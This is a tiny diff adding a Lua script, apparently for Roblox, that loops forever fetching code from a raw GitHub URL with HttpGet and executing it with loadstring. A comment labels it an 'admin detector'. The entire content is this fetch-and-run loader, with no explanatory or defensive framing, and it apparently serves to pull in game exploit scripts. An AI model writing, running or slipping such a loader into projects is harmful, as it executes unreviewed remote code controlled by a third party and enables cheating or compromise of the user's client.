@@ -1,0 +1,7 @@
+
+
+_G.Condition = true
+while _G.Condition do -- Checks if the condition is true
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/G24G/G/main/s'),true))()--admin detector
+wait()
+end
